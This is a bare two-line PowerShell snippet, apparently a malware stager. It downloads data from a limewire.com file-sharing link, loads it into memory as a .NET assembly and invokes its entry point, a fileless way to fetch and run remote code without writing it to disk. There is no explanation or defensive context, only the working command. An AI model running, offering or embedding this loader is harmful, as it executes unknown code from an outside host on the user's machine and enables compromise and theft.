$wc=New-Object Net.WebClient;$b=$wc.DownloadData('https://limewire.com/d/FDphV#TmLbLMqVie')
$a=[Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,$null)
